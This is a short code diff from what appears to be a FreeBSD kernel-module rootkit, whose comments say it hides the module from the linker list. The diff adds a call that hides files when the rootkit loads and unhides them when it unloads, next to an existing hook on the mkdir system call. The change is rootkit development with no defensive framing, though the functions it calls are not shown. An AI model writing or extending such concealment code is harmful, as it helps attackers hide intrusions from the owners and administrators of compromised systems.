@@ -47,6 +47,9 @@ init(void)
 	/* Hide rootkit. */
 	hide_kld(LINKER_NAME);
 	hide_ko(MODULE_NAME);
+
+	/* Hide files. */
+	hide_files();
 }
 
 static void
@@ -54,6 +57,9 @@ die(void)
 {
 	/* Disable interface. */
 	hook_syscall_set(SYS_mkdir, sys_mkdir);
+
+	/* Unhide files. */
+	unhide_files();
 }
 
 static int
